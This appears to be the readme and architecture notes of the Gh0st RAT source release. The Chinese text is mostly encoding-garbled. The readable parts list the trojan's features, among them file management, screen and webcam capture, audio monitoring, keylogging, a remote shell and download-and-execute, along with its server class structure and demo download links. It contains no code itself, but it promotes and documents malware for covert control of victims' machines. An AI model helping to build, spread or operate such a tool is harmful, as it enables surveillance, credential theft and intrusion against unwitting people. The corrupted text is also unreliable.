Gh0st RAT[2008127����]

Gh0st RAT
C.Rufus Security Team
http://www.wolfexp.net

���ƶ������˶�����IOCPģ�ͣ����ݴ������zlibѹ����ʽ
�ȶ����٣��������������ޣ���ͬʱ��������̨����
���ƶ��Զ����CPUʹ���ʵ����Լ��Ĺ����߳�, �ȶ���Ч
����Ϊsvchost��ϵͳ��������,���߼��Ϊ������
���������Ʒ�ֹ�������..
֧��HTTP��DNS�������ַ�ʽ
�Զ��ָ�SSDT(�⹦�ܸ�ʲô����Ҷ�֪������ɱ�Լ�����)
���ƶ�224K�����ӹ���Ľ��棬���ɵķ�����޿ǣ�156K���ɶ���ظ���װ,�ظ���װҪ��2�룬Ҫ�˳��ػ��߳�
����ϸ�ڷ���Ĺ��ܴ���Լ�ȥ���ְ�

����:
�ļ�����  ��ȫ��Radmin��д, �ļ����ļ��������ϴ���ɾ�������ء�������������..
��Ļ����  ��ģ��ȫ�û���д�������ٶȿ죬������Ļ������Ctrl+Alt+Del��7��ɫ����ʾ��ʽ
���̼�¼  �ɼ�¼��Ӣ����Ϣ�����߼�¼(��¼����50M)����
Զ���ն�  һ����shell
ϵͳ����  ���̹������ڹ����������������ȡ
��Ƶ���  ���Զ������ͷ
�Ự����  ע�����������ػ���ж�ط����
��������  ����ִ��ָ��URL�еĳ������ػ�����ʾ����ָ����ַ�����ϵͳ��־
��ַλ��  ��IP���ݿ��ļ�QQWry.Dat���ó���ͬĿ¼�¼�����ʾ����λ��
��Ⱥ����  ��ͬʱ���ƶ�̨������ͬʱ����Ƶ��صȹ�����


��ʾ��ַ
http://www.wolfexp.net/other/Gh0st_RAT/index.html
http://www.wolfexp.net/other/Gh0st_RAT/demo.rar


�������ע���ǰ�ȫС��ٷ���վ http://www.wolfexp.net/



#Դ�����


CMainFrame	��UI�����																										-
																															|
	NotifyProc	���գ����ַ������¼�																						|
																															|	
	@NC_CLIENT_CONNECT																										|
	@NC_CLIENT_DISCONNECT																									|
	@NC_TRANSMIT:																											|
	@NC_RECEIVE:					->	�������																			|
	@NC_RECEIVE_COMPLETE			->  �¼����	-> �ַ� ������Ϣ  �߼���Ϣ												|
																															|		
																															|
																															|
																															|
CGh0stApp	���߼���																										|
	|																														|
	|																														|
	-------------------CGh0stView ������ͼ��																				|
							|																								|
							|																								|
							|																								|
							--------------------------��ʼ�� ����CSettingsView												|
							|								 ����CBuildView													|
							|																								|	
							|																								|
							|																	NotifyProc					|	
							-------------------------CIOCPServer ���ƶ�IO����  ---------------------------------------->CMainFrame
																|															|
																|															|
																|-----------ListenThreadProc------------------OnAccept------------PostRecv
																|												  |			|
																|												  |(��)	|
																|-----------��ɶ˿�-------------------------------			|
																|															|
																|															|
																|-----------ThreadPoolFunc�����߳�-----------------ProcessIOMessage(OnClientReading, OnClientWriting, OnClientInitializing)



#���ַܷ�
@CFileManagerDlg		�ļ�����
@CScreenSpyDlg			��Ļ����
@CWebCamDlg				��Ƶ�鿴
@CAudioDlg				��������
@CKeyBoardDlg			���̼�¼
@CSystemDlg				ϵͳ����
@CShellDlg				Զ���ն�













